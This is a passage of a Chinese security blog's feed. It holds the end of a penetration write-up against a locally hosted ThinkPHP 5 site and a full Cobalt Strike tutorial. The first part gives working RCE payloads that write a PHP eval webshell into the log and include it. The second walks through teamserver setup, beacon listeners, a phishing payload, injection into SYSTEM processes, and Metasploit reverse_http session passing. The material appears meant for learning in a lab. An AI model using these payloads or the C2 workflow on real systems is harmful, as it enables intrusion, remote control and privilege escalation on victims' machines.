phpinfo();&#x27;</span>)&amp;_method=__construct&amp;method=POST&amp;filter[]=assert</span><br></pre></td></tr></table></figure><h1 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h1><p>google了一下,找到日志写shell方法</p><p>将shell写入日志</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/index.php?s=captcha</span><br><span class="line">_method=__construct&amp;method=get&amp;filter[]=call_user_func&amp;server[]=-<span class="number">1</span>&amp;get[]=<span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207211922941.png"></p><p>包含日志文件getshell,成功执行phpinfo</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_method=__construct&amp;method=get&amp;filter[]=think\__include_file&amp;server[]=-<span class="number">1</span>&amp;get[]=../runtime/log/<span class="number">202207</span>/<span class="number">21</span>.log&amp;shell=<span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207211923675.png"></p><p>上蚁剑<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207211926496.png"><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207211928165.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;以下为本地环境搭建&lt;/p&gt;
&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;&lt;p&gt;报错拿到cms信息,windows+iis+tp5&lt;br&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202207211912912.png&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;web打点&quot;&gt;&lt;a href=&quot;#web打点&quot; class=&quot;headerlink&quot; title=&quot;web打点&quot;&gt;&lt;/a&gt;web打点&lt;/h1&gt;</summary>
    
    
    
    <category term="渗透实战" scheme="https://syst1m.top/categories/%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/"/>
    
    
    <category term="getshell" scheme="https://syst1m.top/tags/getshell/"/>
    
    <category term="thinkphp" scheme="https://syst1m.top/tags/thinkphp/"/>
    
  </entry>
  
  <entry>
    <title>Cobalt Strike使用学习</title>
    <link href="https://syst1m.top/2022/07/20/Cobalt-Strike%E4%BD%BF%E7%94%A8%E5%AD%A6%E4%B9%A0/"/>
    <id>https://syst1m.top/2022/07/20/Cobalt-Strike%E4%BD%BF%E7%94%A8%E5%AD%A6%E4%B9%A0/</id>
    <published>2022-07-20T12:30:38.000Z</published>
    <updated>2022-07-22T11:36:41.948Z</updated>
    
    <content type="html"><![CDATA[<h1 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h1><p>Cobalt Strike使用C&#x2F;S架构，Cobalt Strike的客户端连接到团队服务器，团队服务器连接到目标，也就是说Cobalt Strike的客户端不与目标服务器进行交互。</p><h2 id="启动服务端"><a href="#启动服务端" class="headerlink" title="启动服务端"></a>启动服务端</h2><p>服务端一般设在公网ip的服务器上</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ./teamserver your_ip your_passowrd [config_file]</span></span><br><span class="line">./teamserver 192.168.31.118 123456</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207212117798.png"></p><h2 id="启动客户端"><a href="#启动客户端" class="headerlink" title="启动客户端"></a>启动客户端</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cobaltstrike   </span><br></pre></td></tr></table></figure><p>输入刚才设置的ip和密码</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207212121225.png"></p><h2 id="连接多个服务端"><a href="#连接多个服务端" class="headerlink" title="连接多个服务端"></a>连接多个服务端</h2><p>直接新建配置即可</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207212123267.png"></p><h1 id="监听器"><a href="#监听器" class="headerlink" title="监听器"></a>监听器</h1><p>监听器就是等待被入侵系统连接自己的一个服务。要是为了接受payload回传的各类数据，类似于MSF中handler的作用。比如payload在目标机器执行以后，就会回连到监听器然后下载执行真正的shellcode代码。</p><h2 id="Beacon"><a href="#Beacon" class="headerlink" title="Beacon"></a>Beacon</h2><ul><li>Beacon是CS的payload，和msf中的meterpreter一样</li><li>Beacon有两种通信模式。一种是异步通信模式，这种模式通信效率缓慢，Beacon回连团队服务器、下载任务、然后休眠；另一种是交互式通信模式，这种模式的通信是实时发生的。</li><li>通过HTTP、HTTPS和DNS出口网络</li><li>使用SMB协议的时候是点对点通信</li></ul><h2 id="HTTP和HTTPS-Beacon"><a href="#HTTP和HTTPS-Beacon" class="headerlink" title="HTTP和HTTPS Beacon"></a>HTTP和HTTPS Beacon</h2><ul><li>HTTP 和 HTTPS Beacon HTTP和HTTPS Beacon也可以叫做Web Beacon。默认设置情况下，HTTP 和 HTTPS Beacon 通过 HTTP GET 请求来下载任务。这些 Beacon 通过 HTTP POST 请求传回数据。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">windows/beacon_http/reverse_http</span><br><span class="line">windows/beacon_https/reverse_https</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207212132790.png"></p><p>测试一下http监听器，用刚才的监听器生成一个钓鱼链接</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207212146999.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207212300319.png"></p><p>将生成的payload放入windows中运行</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207212307393.png"></p><p>成功上线cs</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207212308113.png"></p><p>HTTPS和HTTP一样，不同的是HTTPS需要一个SSL证书具体如何配置可以参考：<a href="https://www.cobaltstrike.com/help-malleable-c2#validssl">https://www.cobaltstrike.com/help-malleable-c2#validssl</a></p><h2 id="DNS-Beacon"><a href="#DNS-Beacon" class="headerlink" title="DNS Beacon"></a>DNS Beacon</h2><p>DNS Beacon，顾名思义就是使用DNS请求将Beacon返回。这些 DNS 请求用于解析由你的 CS 团队服务器作为权威 DNS 服务器的域名。DNS 响应告诉 Beacon 休眠或是连接到团队服务器来下载任务。DNS 响应也告诉 Beacon 如何从你的团队服务器下载任务。</p><p>因为没有多余的域名，所以不演示</p><h2 id="SMB-Beacon"><a href="#SMB-Beacon" class="headerlink" title="SMB Beacon"></a>SMB Beacon</h2><p>SMB Beacon 使用命名管道通过一个父 Beacon 进行通信。这种对等通信对同一台主机上的 Beacon 和跨网络的 Beacon 都有效。Windows 将命名管道通信封装在 SMB 协议中。因此得名 SMB Beacon。此流量封装在SMB协议中，所以SMB Beacon相对隐蔽，绕防火墙时可能发挥奇效(系统防火墙默认是允许445的端口与外界通信的，其他端口可能会弹窗提醒，会导致远程命令行反弹shell失败)。</p><p>SMB Beacon监听器对“提升权限”和“横向渗透”中很有用。</p><p><img src="https://cdn.jsdelivr.net/gh/JOHN-FROD/PicGo/blog-img/20220212105842.png" alt="img"></p><p>新建SMB监听器</p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207221643881.png" style="zoom:50%;" /><p>派生会话到SMB监听器</p><p>右键-&gt;新建会话-&gt;选择smb监听器 或者使用命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spawn SMB</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207221645118.png"></p><p>等待一会，就可以看到SMB Beacon，在external可以看到∞∞字符</p><p>此时SMB Beacon通过父级的HTTP Beacon与CS服务器进行通信，而SMB Beacon与HTTP Beacon通过SMB协议进行通信。</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207221649191.png"></p><p>将SMB Beacon插入系统进程</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207221652561.png"></p><p>注入到system权限的系统进程，返回的会话则是system权限，管理器权限带*👌🏻</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207221653011.png"></p><p>此时如果想断开某个会话的连接，可以使用unlink命令，比如如果想断开192.168.175.144，就可以在Beacon中输入<code>unlink 10.10.10.80</code></p><p>如果想再次连上，就直接输入<code>link </code>10.10.10.80，想从当前主机连到其他主机也可以使用此命令。</p><p>在进程中注入SMB Beacon后，便能看到process为vmtoolsed.exe的派生SMB Beacon。</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207221654922.png"></p><h2 id="TCP-Beacon"><a href="#TCP-Beacon" class="headerlink" title="TCP Beacon"></a>TCP Beacon</h2><p>TCP Beacon与SMB Beacon类似，区别在于这里使用的是TCP协议与父级Beacon进行通信，使用这种方式上线时流量是不加密的。</p><p>新建TCP Beacon</p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207221657163.png" style="zoom:50%;" /><p>使用方法和上面一致</p><h2 id="Foreign-Beacon"><a href="#Foreign-Beacon" class="headerlink" title="Foreign Beacon"></a>Foreign Beacon</h2><p>使用Cobalt Strike外部监听器可以派生给msf的meterpreter会话，这里有Foreign HTTP和Foreign HTTPS两种监听器，其中Foreign HTTPS的流量是加密的。</p><p>msf先起一个监听，msf的payload只能使用http方式，因为cs的监听器只支持http和https</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_http</span><br><span class="line"><span class="built_in">set</span> LHOST 192.168.31.118</span><br><span class="line"><span class="built_in">set</span> LPORT 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207221712096.png"></p><p>CS配置一个Foreign HTTP，要与msf的端口、ip、payload一致</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207221709422.png"></p><p>spawn msf 派生给msf，msf会收到会话</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207221923888.png"></p><p>不知道为什么没有复现成功</p><p>msf派生会话给cs</p><p>生成监听器</p><p> <img src="https://raw.githubusercontent.com/chencicici/images/main/202207221929827.png"></p><p>msf派生会话</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/local/payload_inject</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_http</span><br><span class="line"><span class="built_in">set</span> DisablePayloadHandler <span class="literal">true</span>   <span class="comment">#默认情况下，payload_inject执行之后会在本地产生一个新的handler，由于我们已经有了一个，所以不需要在产生一个，所以这里我们设置为true</span></span><br><span class="line"><span class="built_in">set</span> lhost x.x.x.x               <span class="comment">#cobaltstrike监听的ip</span></span><br><span class="line"><span class="built_in">set</span> lport 6789                 <span class="comment">#cobaltstrike监听的端口 </span></span><br><span class="line"><span class="built_in">set</span> session 1                   <span class="comment">#这里是获得的session的id</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207221935284.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;基本使用&quot;&gt;&lt;a href=&quot;#基本使用&quot; class=&quot;headerlink&quot; title=&quot;基本使用&quot;&gt;&lt;/a&gt;基本使用&lt;/h1&gt;&lt;p&gt;Cobalt Strike使用C&amp;#x2F;S架构，Cobalt Strike的客户端连接到团队服务器，团队服务器连接到目标，也就是说Cobalt Strike的客户端不与目标服务器进行交互。&lt;/p&gt;
&lt;h2 id=&quot;启动服务端&quot;&gt;&lt;a href=&quot;#启动服务端&quot; class=&quot;headerlink&quot; title=&quot;启动服务端&quot;&gt;&lt;/a&gt;启动服务端&lt;/h2&gt;&lt;p&gt;服务端一般设在公网ip的服务器上&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# ./teamserver your_ip your_passowrd [config_file]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;./teamserver 192.168.31.118 123456&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="工具使用" scheme="https://syst1m.top/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
    
    <category term="cs" scheme="https://syst1m.top/tags/cs/"/>
    
  </entry>
  
</feed>
